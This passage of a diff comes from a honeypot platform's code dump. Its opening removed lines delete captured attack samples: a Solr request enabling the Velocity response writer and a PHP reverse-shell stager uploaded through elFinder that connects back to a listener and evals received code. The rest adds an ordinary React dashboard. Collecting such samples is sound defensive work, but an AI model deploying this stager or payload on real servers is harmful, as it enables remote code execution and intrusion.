-{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","params.resource.loader.enabled":"true"}}
-```
-
 ### `honeypot-platform/hub/data/blobs/e3/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`  _(~0.0 KB; showing ≤800 lines)_
 ```
 
-```
-
-### `honeypot-platform/hub/data/blobs/ea/ea5c693ce946836cad821a0728ef4af86003d8d677c2f850ecb4a6820f5196ca`  _(~1.5 KB; showing ≤800 lines)_
-```
------------------------------117040845903397462292764033115
-Content-Disposition: form-data; name="cmd"
-
-upload
------------------------------117040845903397462292764033115
-Content-Disposition: form-data; name="target"
-
-l1_
------------------------------117040845903397462292764033115
-Content-Disposition: form-data; name="upload[]"; filename="y1o7pi.php"
-Content-Type: application/octet-stream
-
-/*<?php /**/ error_reporting(0); $ip = '192.168.0.18'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
------------------------------117040845903397462292764033115--
 ```
 
 ### `honeypot-platform/hub/docker-compose.yml`  _(~0.2 KB; showing ≤800 lines)_
@@ -3207,9 +3924,741 @@ services:
       - "8000:8000"
     environment:
       - HOHO_HUB_DATA=/data
-      - HOHO_HUB_TOKEN=${HOHO_HUB_TOKEN:-changeme-please-override}
+      - HOHO_HUB_TOKEN=${HOHO_HUB_TOKEN:-}
     volumes:
       - ./data:/data
+```
+
+### `honeypot-platform/hub/requirements.txt`  _(~0.0 KB; showing ≤800 lines)_
+```
+fastapi
+uvicorn
+jinja2
+python-magic
+```
+
+### `honeypot-platform/hub/webui/index.html`  _(~0.3 KB; showing ≤800 lines)_
+```html
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HOHO Hub</title>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+```
+
+### `honeypot-platform/hub/webui/package.json`  _(~0.6 KB; showing ≤800 lines)_
+```json
+{
+  "name": "hoho-hub-webui",
+  "private": true,
+  "version": "0.1.0",
+  "type": "module",
+  "scripts": {
+    "dev": "vite",
+    "build": "tsc -b && vite build",
+    "preview": "vite preview"
+  },
+  "dependencies": {
+    "@emotion/react": "^11.14.0",
+    "@emotion/styled": "^11.14.0",
+    "@mui/icons-material": "^7.3.1",
+    "@mui/material": "^7.3.1",
+    "dayjs": "^1.11.13",
+    "react": "^19.1.1",
+    "react-dom": "^19.1.1",
+    "react-router-dom": "^7.8.2"
+  },
+  "devDependencies": {
+    "@types/react": "^19.1.10",
+    "@types/react-dom": "^19.1.7",
+    "@vitejs/plugin-react": "^5.0.0",
+    "typescript": "^5.9.2",
+    "vite": "^7.1.3"
+  }
+}
+```
+
+### `honeypot-platform/hub/webui/src/App.tsx`  _(~1.7 KB; showing ≤800 lines)_
+```tsx
+import { AppBar, Box, CssBaseline, Drawer, List, ListItemButton, ListItemText, Toolbar, Typography } from '@mui/material'
+import { BrowserRouter, Navigate, Route, Routes } from 'react-router-dom'
+import Dashboard from './pages/Dashboard'
+import EventDetailPage from './pages/EventDetail'
+import FilesPage from './pages/Files'
+import HoneypotPage from './pages/Honeypot'
+import SessionPage from './pages/Session'
+
+const drawerWidth = 220
+
+export default function App() {
+  return (
+    <BrowserRouter>
+      <CssBaseline />
+      <AppBar position="fixed" sx={{ zIndex: (t) => t.zIndex.drawer + 1 }}>
+        <Toolbar><Typography variant="h6">HOHO Hub</Typography></Toolbar>
+      </AppBar>
+      <Drawer
+        variant="permanent"
+        sx={{ width: drawerWidth, [`& .MuiDrawer-paper`]: { width: drawerWidth, boxSizing: 'border-box' } }}
+      >
+        <Toolbar />
+        <List>
+          <ListItemButton component="a" href="/ui/"><ListItemText primary="Dashboard" /></ListItemButton>
+          <ListItemButton component="a" href="/ui/files"><ListItemText primary="Files" /></ListItemButton>
+        </List>
+      </Drawer>
+      <Box component="main" sx={{ ml: `${drawerWidth}px`, p: 2 }}>
+        <Toolbar />
+        <Routes>
+          <Route path="/ui" element={<Dashboard />} />
+          <Route path="/ui/honeypots/:honeypotId" element={<HoneypotPage />} />
+          <Route path="/ui/honeypots/:honeypotId/sessions/:sessionId" element={<SessionPage />} />
+          <Route path="/ui/events/:eventId" element={<EventDetailPage />} />
+          <Route path="/ui/files" element={<FilesPage />} />
+          <Route path="*" element={<Navigate to="/ui" replace />} />
+        </Routes>
+      </Box>
+    </BrowserRouter>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/api/client.ts`  _(~1.2 KB; showing ≤800 lines)_
+```ts
+import type { Artifact, EventDetail, EventSummary, SessionSummary, HoneypotSummary } from './types'
+
+async function getJson<T>(url: string): Promise<T> {
+  const res = await fetch(url)
+  if (!res.ok) throw new Error(`request failed: ${res.status}`)
+  return res.json() as Promise<T>
+}
+
+export const api = {
+  honeypots: () => getJson<HoneypotSummary[]>('/api/v1/honeypots'),
+  sessions: (honeypotId: string) => getJson<SessionSummary[]>(`/api/v1/honeypots/${encodeURIComponent(honeypotId)}/sessions`),
+  sessionEvents: (honeypotId: string, sessionId: string, beforeTs?: string) => {
+    const params = new URLSearchParams({ limit: '200' })
+    if (beforeTs) params.set('before_ts', beforeTs)
+    return getJson<EventSummary[]>(`/api/v1/honeypots/${encodeURIComponent(honeypotId)}/sessions/${encodeURIComponent(sessionId)}/events?${params.toString()}`)
+  },
+  events: (limit = 200) => getJson<EventSummary[]>(`/api/v1/events?limit=${limit}`),
+  eventDetail: (eventId: string) => getJson<EventDetail>(`/api/v1/events/${encodeURIComponent(eventId)}`),
+  artifacts: (params: Record<string, string>) => getJson<Artifact[]>(`/api/v1/artifacts?${new URLSearchParams(params).toString()}`),
+}
+```
+
+### `honeypot-platform/hub/webui/src/api/types.ts`  _(~1.1 KB; showing ≤800 lines)_
+```ts
+export type EventSummary = {
+  event_id: string
+  ts: string
+  honeypot_id: string
+  session_id: string
+  event_name: string
+  component: string
+  verdict: string
+  tags: string[]
+  artifacts_count?: number
+  artifact_badges?: string[]
+}
+
+export type EventArtifact = {
+  kind?: string
+  sha256?: string
+  mime?: string
+  storage_ref?: string
+  meta?: Record<string, unknown>
+  detected_mime?: string
+  detected_desc?: string
+  guessed_ext?: string
+}
+
+export type EventDetail = {
+  event_id?: string
+  artifacts?: EventArtifact[]
+  [key: string]: unknown
+}
+
+export type HoneypotSummary = {
+  honeypot_id: string
+  last_seen_ts: string
+  sessions_count: number
+  events_count: number
+}
+
+export type SessionSummary = {
+  session_id: string
+  agent_id: string
+  started_ts: string
+  last_seen_ts: string
+}
+
+export type Artifact = {
+  artifact_id: string
+  ts: string
+  honeypot_id: string
+  session_id: string
+  event_id: string
+  kind: string
+  sha256: string
+  size: number
+  mime: string
+  storage_ref: string
+  meta: Record<string, unknown>
+  detected_mime?: string
+  detected_desc?: string
+  guessed_ext?: string
+}
+```
+
+### `honeypot-platform/hub/webui/src/components/ArtifactTable.tsx`  _(~2.1 KB; showing ≤800 lines)_
+```tsx
+import { Button, Chip, Link, Table, TableBody, TableCell, TableHead, TableRow, Tooltip } from '@mui/material'
+import { Link as RouterLink } from 'react-router-dom'
+import type { Artifact } from '../api/types'
+
+function shortType(desc?: string) {
+  if (!desc) return '-'
+  return desc.length > 64 ? `${desc.slice(0, 61)}...` : desc
+}
+
+export function ArtifactTable({ artifacts, onPreview }: { artifacts: Artifact[]; onPreview: (a: Artifact) => void }) {
+  return (
+    <Table size="small">
+      <TableHead>
+        <TableRow>
+          <TableCell>Timestamp</TableCell>
+          <TableCell>Artifact</TableCell>
+          <TableCell>Kind</TableCell>
+          <TableCell>Type</TableCell>
+          <TableCell>MIME</TableCell>
+          <TableCell>Ext</TableCell>
+          <TableCell>Size</TableCell>
+          <TableCell>Actions</TableCell>
+        </TableRow>
+      </TableHead>
+      <TableBody>
+        {artifacts.map((artifact) => (
+          <TableRow key={artifact.artifact_id}>
+            <TableCell>{artifact.ts}</TableCell>
+            <TableCell>
+              <Link component={RouterLink} to={`/ui/events/${artifact.event_id}`}>{artifact.artifact_id}</Link>
+            </TableCell>
+            <TableCell><Chip label={artifact.kind || 'unknown'} size="small" /></TableCell>
+            <TableCell>
+              <Tooltip title={artifact.detected_desc || ''}>
+                <span>{shortType(artifact.detected_desc)}</span>
+              </Tooltip>
+            </TableCell>
+            <TableCell>
+              <Chip label={artifact.detected_mime || artifact.mime || '-'} size="small" variant="outlined" />
+            </TableCell>
+            <TableCell>{artifact.guessed_ext || '-'}</TableCell>
+            <TableCell>{artifact.size ?? '-'}</TableCell>
+            <TableCell>
+              <Button href={`/api/v1/artifacts/${encodeURIComponent(artifact.artifact_id)}/download`} size="small">Download</Button>
+              <Button onClick={() => onPreview(artifact)} size="small">Preview</Button>
+            </TableCell>
+          </TableRow>
+        ))}
+      </TableBody>
+    </Table>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/components/EventFeed.tsx`  _(~1.1 KB; showing ≤800 lines)_
+```tsx
+import { Chip, List, ListItem, ListItemText, Paper, Stack } from '@mui/material'
+import dayjs from 'dayjs'
+import type { EventSummary } from '../api/types'
+
+export function EventFeed({ events }: { events: EventSummary[] }) {
+  return (
+    <Paper variant="outlined" sx={{ maxHeight: 480, overflow: 'auto' }}>
+      <List dense>
+        {events.map((event) => (
+          <ListItem key={event.event_id}>
+            <ListItemText
+              primary={`${event.event_name} · ${event.verdict || 'unknown'} · ${event.component}`}
+              secondary={
+                <Stack direction="row" spacing={1} alignItems="center" flexWrap="wrap">
+                  <span>{`${dayjs(event.ts).format('HH:mm:ss')} · ${event.honeypot_id}/${event.session_id}`}</span>
+                  {event.artifact_badges?.map((badge) => (
+                    <Chip key={`${event.event_id}-${badge}`} size="small" label={badge.toUpperCase().slice(0, 4)} />
+                  ))}
+                </Stack>
+              }
+            />
+          </ListItem>
+        ))}
+      </List>
+    </Paper>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/components/EventTable.tsx`  _(~1.6 KB; showing ≤800 lines)_
+```tsx
+import { Chip, Link, Table, TableBody, TableCell, TableHead, TableRow } from '@mui/material'
+import dayjs from 'dayjs'
+import { Link as RouterLink } from 'react-router-dom'
+import type { EventSummary } from '../api/types'
+
+export function EventTable({ events }: { events: EventSummary[] }) {
+  return (
+    <Table size="small">
+      <TableHead>
+        <TableRow>
+          <TableCell>Timestamp</TableCell>
+          <TableCell>Event</TableCell>
+          <TableCell>Component</TableCell>
+          <TableCell>Verdict</TableCell>
+          <TableCell>Tags</TableCell>
+          <TableCell>Artifacts</TableCell>
+        </TableRow>
+      </TableHead>
+      <TableBody>
+        {events.map((event) => (
+          <TableRow key={event.event_id}>
+            <TableCell>{dayjs(event.ts).format('YYYY-MM-DD HH:mm:ss')}</TableCell>
+            <TableCell>
+              <Link component={RouterLink} to={`/ui/events/${event.event_id}`}>{event.event_name}</Link>
+            </TableCell>
+            <TableCell>{event.component}</TableCell>
+            <TableCell>{event.verdict || '-'}</TableCell>
+            <TableCell>
+              {event.tags?.slice(0, 3).map((tag) => (
+                <Chip key={tag} size="small" label={tag} sx={{ mr: 0.5 }} />
+              ))}
+            </TableCell>
+            <TableCell>
+              {event.artifact_badges?.map((badge) => (
+                <Chip key={badge} size="small" label={badge.toUpperCase().slice(0, 4)} sx={{ mr: 0.5 }} />
+              ))}
+            </TableCell>
+          </TableRow>
+        ))}
+      </TableBody>
+    </Table>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/hooks/useEventStream.ts`  _(~0.8 KB; showing ≤800 lines)_
+```ts
+import { useEffect } from 'react'
+import type { EventSummary } from '../api/types'
+
+export function useEventStream(filters: { honeypot_id?: string; session_id?: string; since_ts?: string }, onEvent: (evt: EventSummary) => void) {
+  useEffect(() => {
+    const params = new URLSearchParams()
+    if (filters.honeypot_id) params.set('honeypot_id', filters.honeypot_id)
+    if (filters.session_id) params.set('session_id', filters.session_id)
+    if (filters.since_ts) params.set('since_ts', filters.since_ts)
+
+    const es = new EventSource(`/api/v1/stream/events?${params.toString()}`)
+    es.onmessage = (msg) => {
+      onEvent(JSON.parse(msg.data) as EventSummary)
+    }
+    return () => es.close()
+  }, [filters.honeypot_id, filters.session_id, filters.since_ts, onEvent])
+}
+```
+
+### `honeypot-platform/hub/webui/src/main.tsx`  _(~0.2 KB; showing ≤800 lines)_
+```tsx
+import { StrictMode } from 'react'
+import { createRoot } from 'react-dom/client'
+import App from './App'
+
+createRoot(document.getElementById('root')!).render(
+  <StrictMode>
+    <App />
+  </StrictMode>,
+)
+```
+
+### `honeypot-platform/hub/webui/src/pages/Dashboard.tsx`  _(~1.6 KB; showing ≤800 lines)_
+```tsx
+import { Card, CardContent, Grid, Link, Typography } from '@mui/material'
+import { useCallback, useEffect, useState } from 'react'
+import { Link as RouterLink } from 'react-router-dom'
+import { api } from '../api/client'
+import type { EventSummary, HoneypotSummary } from '../api/types'
+import { EventFeed } from '../components/EventFeed'
+import { useEventStream } from '../hooks/useEventStream'
+
+export default function Dashboard() {
+  const [honeypots, setHoneypots] = useState<HoneypotSummary[]>([])
+  const [events, setEvents] = useState<EventSummary[]>([])
+
+  useEffect(() => {
+    api.honeypots().then(setHoneypots)
+    api.events(100).then(setEvents)
+  }, [])
+
+  const onEvent = useCallback((evt: EventSummary) => {
+    setEvents((prev) => [evt, ...prev].slice(0, 500))
+  }, [])
+
+  useEventStream({}, onEvent)
+
+  return (
+    <Grid container spacing={2}>
+      <Grid size={{ xs: 12, md: 7 }}>
+        <Typography variant="h5" sx={{ mb: 1 }}>Honeypots</Typography>
+        {honeypots.map((h) => (
+          <Card key={h.honeypot_id} sx={{ mb: 1 }}>
+            <CardContent>
+              <Typography variant="h6">
+                <Link component={RouterLink} to={`/ui/honeypots/${h.honeypot_id}`}>{h.honeypot_id}</Link>
+              </Typography>
+              <Typography variant="body2">Events: {h.events_count} · Sessions: {h.sessions_count}</Typography>
+            </CardContent>
+          </Card>
+        ))}
+      </Grid>
+      <Grid size={{ xs: 12, md: 5 }}>
+        <Typography variant="h5" sx={{ mb: 1 }}>Latest Live Events</Typography>
+        <EventFeed events={events} />
+      </Grid>
+    </Grid>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/pages/EventDetail.tsx`  _(~2.8 KB; showing ≤800 lines)_
+```tsx
+import { Chip, Link, Paper, Table, TableBody, TableCell, TableHead, TableRow, Tooltip, Typography } from '@mui/material'
+import { useEffect, useState } from 'react'
+import { useParams } from 'react-router-dom'
+import { api } from '../api/client'
+import type { EventArtifact, EventDetail } from '../api/types'
+
+function artifactFsPath(artifact: EventArtifact): string {
+  const meta = artifact.meta
+  if (!meta || typeof meta !== 'object') {
+    return artifact.storage_ref || '-'
+  }
+
+  const candidates = ['path', 'filepath', 'file_path', 'target_path', 'url', 'filename']
+  for (const key of candidates) {
+    const value = meta[key]
+    if (typeof value === 'string' && value.length > 0) {
+      return value
+    }
+  }
+  return artifact.storage_ref || '-'
+}
+
+export default function EventDetailPage() {
+  const { eventId = '' } = useParams()
+  const [event, setEvent] = useState<EventDetail | null>(null)
+
+  useEffect(() => {
+    api.eventDetail(eventId).then(setEvent)
+  }, [eventId])
+
+  const artifacts = event?.artifacts || []
+
+  const prettyType = (artifact: EventArtifact) => artifact.detected_desc || artifact.mime || '-'
+
+  return (
+    <>
+      <Typography variant="h5" sx={{ mb: 2 }}>Event {eventId}</Typography>
+      <Paper variant="outlined" sx={{ p: 2, mb: 2, overflowX: 'auto' }}>
+        <pre style={{ margin: 0 }}>{JSON.stringify(event, null, 2)}</pre>
+      </Paper>
+      <Typography variant="h6">Artifacts</Typography>
+      <Table size="small">
+        <TableHead>
+          <TableRow>
+            <TableCell>Kind</TableCell>
+            <TableCell>SHA256</TableCell>
+            <TableCell>Type</TableCell>
+            <TableCell>MIME</TableCell>
+            <TableCell>Ext</TableCell>
+            <TableCell>Honeypot Path</TableCell>
+            <TableCell>Download</TableCell>
+          </TableRow>
+        </TableHead>
+        <TableBody>
+          {artifacts.map((a, i) => (
+            <TableRow key={`${a.sha256 || i}`}>
+              <TableCell>{a.kind || '-'}</TableCell>
+              <TableCell>{a.sha256 || '-'}</TableCell>
+              <TableCell>
+                <Tooltip title={prettyType(a)}>
+                  <span>{prettyType(a).slice(0, 64)}</span>
+                </Tooltip>
+              </TableCell>
+              <TableCell>
+                <Chip size="small" label={a.detected_mime || a.mime || 'unknown'} />
+              </TableCell>
+              <TableCell>{a.guessed_ext || '-'}</TableCell>
+              <TableCell>
+                <Tooltip title={artifactFsPath(a)}>
+                  <span>{artifactFsPath(a).slice(0, 72)}</span>
+                </Tooltip>
+              </TableCell>
+              <TableCell>
+                {a.sha256 ? <Link href={`/blobs/${a.sha256}`}>Download</Link> : '-'}
+              </TableCell>
+            </TableRow>
+          ))}
+        </TableBody>
+      </Table>
+    </>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/pages/Files.tsx`  _(~3.9 KB; showing ≤800 lines)_
+```tsx
+import { Box, Button, Dialog, DialogContent, DialogTitle, MenuItem, Stack, TextField, Typography } from '@mui/material'
+import { useEffect, useMemo, useState } from 'react'
+import { api } from '../api/client'
+import type { Artifact } from '../api/types'
+import { ArtifactTable } from '../components/ArtifactTable'
+
+const MAX_PREVIEW = 64 * 1024
+
+export default function FilesPage() {
+  const [artifacts, setArtifacts] = useState<Artifact[]>([])
+  const [filters, setFilters] = useState({ honeypot_id: '', session_id: '', kind: '', mime_prefix: '', detected_mime_prefix: '', q: '' })
+  const [sortBy, setSortBy] = useState<'ts' | 'size' | 'detected_mime'>('ts')
+  const [sortDir, setSortDir] = useState<'asc' | 'desc'>('desc')
+  const [preview, setPreview] = useState<{ artifact: Artifact; body: string } | null>(null)
+
+  const load = () => {
+    const p = Object.fromEntries(Object.entries(filters).filter(([, v]) => Boolean(v))) as Record<string, string>
+    api.artifacts(p).then(setArtifacts)
+  }
+
+  useEffect(() => {
+    load()
+  }, [])
+
+  const onPreview = async (artifact: Artifact) => {
+    if (!artifact.sha256) return
+    const mime = artifact.detected_mime || artifact.mime
+    if (mime?.startsWith('image/')) {
+      setPreview({ artifact, body: '' })
+      return
+    }
+    if (mime?.startsWith('text/') || mime?.startsWith('application/json')) {
+      const res = await fetch(`/blobs/${artifact.sha256}`)
+      const text = (await res.text()).slice(0, MAX_PREVIEW)
+      setPreview({ artifact, body: text })
+      return
+    }
+    setPreview({ artifact, body: 'No preview available for this mime type' })
+  }
+
+  const sortedArtifacts = useMemo(() => {
+    const copied = [...artifacts]
+    copied.sort((a, b) => {
+      let left = ''
+      let right = ''
+      if (sortBy === 'size') {
+        left = String(a.size ?? 0)
+        right = String(b.size ?? 0)
+      } else if (sortBy === 'detected_mime') {
+        left = a.detected_mime || a.mime || ''
+        right = b.detected_mime || b.mime || ''
+      } else {
+        left = a.ts || ''
+        right = b.ts || ''
+      }
+      const base = left.localeCompare(right, undefined, { numeric: true })
+      return sortDir === 'asc' ? base : -base
+    })
+    return copied
+  }, [artifacts, sortBy, sortDir])
+
+  return (
+    <>
+      <Typography variant="h5" sx={{ mb: 1 }}>Artifacts</Typography>
+      <Stack direction="row" spacing={1} sx={{ mb: 2, flexWrap: 'wrap' }}>
+        {Object.keys(filters).map((key) => (
+          <TextField
+            key={key}
+            size="small"
+            label={key}
+            value={filters[key as keyof typeof filters]}
+            onChange={(e) => setFilters((f) => ({ ...f, [key]: e.target.value }))}
+          />
+        ))}
+        <TextField select size="small" label="sort_by" value={sortBy} onChange={(e) => setSortBy(e.target.value as typeof sortBy)}>
+          <MenuItem value="ts">timestamp</MenuItem>
+          <MenuItem value="size">size</MenuItem>
+          <MenuItem value="detected_mime">detected_mime</MenuItem>
+        </TextField>
+        <TextField select size="small" label="sort_dir" value={sortDir} onChange={(e) => setSortDir(e.target.value as typeof sortDir)}>
+          <MenuItem value="desc">desc</MenuItem>
+          <MenuItem value="asc">asc</MenuItem>
+        </TextField>
+        <Button variant="contained" onClick={load}>Apply</Button>
+      </Stack>
+      <ArtifactTable artifacts={sortedArtifacts} onPreview={onPreview} />
+
+      <Dialog open={Boolean(preview)} onClose={() => setPreview(null)} maxWidth="md" fullWidth>
+        <DialogTitle>Preview</DialogTitle>
+        <DialogContent>
+          {preview && (preview.artifact.detected_mime || preview.artifact.mime)?.startsWith('image/') ? (
+            <Box component="img" src={`/blobs/${preview.artifact.sha256}`} sx={{ maxWidth: '100%' }} />
+          ) : (
+            <pre>{preview?.body}</pre>
+          )}
+        </DialogContent>
+      </Dialog>
+    </>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/pages/Honeypot.tsx`  _(~1.4 KB; showing ≤800 lines)_
+```tsx
+import { List, ListItemButton, ListItemText, Typography } from '@mui/material'
+import { useCallback, useEffect, useState } from 'react'
+import { Link as RouterLink, useParams } from 'react-router-dom'
+import { api } from '../api/client'
+import type { EventSummary, SessionSummary } from '../api/types'
+import { EventFeed } from '../components/EventFeed'
+import { useEventStream } from '../hooks/useEventStream'
+
+export default function HoneypotPage() {
+  const { honeypotId = '' } = useParams()
+  const [sessions, setSessions] = useState<SessionSummary[]>([])
+  const [events, setEvents] = useState<EventSummary[]>([])
+
+  useEffect(() => {
+    api.sessions(honeypotId).then(setSessions)
+  }, [honeypotId])
+
+  const onEvent = useCallback((evt: EventSummary) => {
+    setEvents((prev) => [evt, ...prev].slice(0, 500))
+  }, [])
+
+  useEventStream({ honeypot_id: honeypotId }, onEvent)
+
+  return (
+    <>
+      <Typography variant="h5" sx={{ mb: 1 }}>{honeypotId}</Typography>
+      <Typography variant="h6">Sessions</Typography>
+      <List dense>
+        {sessions.map((s) => (
+          <ListItemButton key={s.session_id} component={RouterLink} to={`/ui/honeypots/${honeypotId}/sessions/${s.session_id}`}>
+            <ListItemText primary={s.session_id} secondary={`${s.agent_id || 'unknown'} · ${s.last_seen_ts}`} />
+          </ListItemButton>
+        ))}
+      </List>
+      <Typography variant="h6">Live feed</Typography>
+      <EventFeed events={events} />
+    </>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/src/pages/Session.tsx`  _(~1.3 KB; showing ≤800 lines)_
+```tsx
+import { Button, Stack, Typography } from '@mui/material'
+import { useCallback, useEffect, useState } from 'react'
+import { useParams } from 'react-router-dom'
+import { api } from '../api/client'
+import type { EventSummary } from '../api/types'
+import { EventTable } from '../components/EventTable'
+import { useEventStream } from '../hooks/useEventStream'
+
+export default function SessionPage() {
+  const { honeypotId = '', sessionId = '' } = useParams()
+  const [events, setEvents] = useState<EventSummary[]>([])
+
+  useEffect(() => {
+    api.sessionEvents(honeypotId, sessionId).then(setEvents)
+  }, [honeypotId, sessionId])
+
+  const onEvent = useCallback((evt: EventSummary) => {
+    setEvents((prev) => [evt, ...prev.filter((e) => e.event_id !== evt.event_id)].slice(0, 500))
+  }, [])
+
+  useEventStream({ honeypot_id: honeypotId, session_id: sessionId }, onEvent)
+
+  const loadMore = async () => {
+    const tail = events[events.length - 1]
+    const more = await api.sessionEvents(honeypotId, sessionId, tail?.ts)
+    setEvents((prev) => [...prev, ...more])
+  }
+
+  return (
+    <>
+      <Typography variant="h5" sx={{ mb: 2 }}>{honeypotId} / {sessionId}</Typography>
+      <EventTable events={events} />
+      <Stack direction="row" sx={{ mt: 2 }}>
+        <Button onClick={loadMore} variant="outlined">Load older</Button>
+      </Stack>
+    </>
+  )
+}
+```
+
+### `honeypot-platform/hub/webui/tsconfig.json`  _(~0.4 KB; showing ≤800 lines)_
+```json
+{
+  "compilerOptions": {
+    "target": "ES2020",
+    "useDefineForClassFields": true,
+    "lib": ["ES2020", "DOM", "DOM.Iterable"],
+    "module": "ESNext",
+    "skipLibCheck": true,
+    "moduleResolution": "Bundler",
+    "allowImportingTsExtensions": false,
+    "resolveJsonModule": true,
+    "isolatedModules": true,
+    "noEmit": true,
+    "jsx": "react-jsx",
+    "strict": false
+  },
+  "include": ["src"]
+}
+```
+
+### `honeypot-platform/hub/webui/tsconfig.node.json`  _(~0.2 KB; showing ≤800 lines)_
+```json
+{
+  "compilerOptions": {
+    "composite": true,
+    "skipLibCheck": true,
+    "module": "ESNext",
+    "moduleResolution": "Bundler"
+  },
+  "include": ["vite.config.ts"]
+}
+```
+
+### `honeypot-platform/hub/webui/vite.config.ts`  _(~0.3 KB; showing ≤800 lines)_
+```ts
+import { defineConfig } from 'vite'
+import react from '@vitejs/plugin-react'
+
+export default defineConfig({
+  base: '/ui/',
+  plugins: [react()],
+  server: {
+    proxy: {
+      '/api': 'http://localhost:8000',
+      '/blobs': 'http://localhost:8000',
+    },
+  },
+})
 ```
 
 ### `honeypot-platform/packages/hoho_core/README.md`  _(~0.1 KB; showing ≤800 lines)_
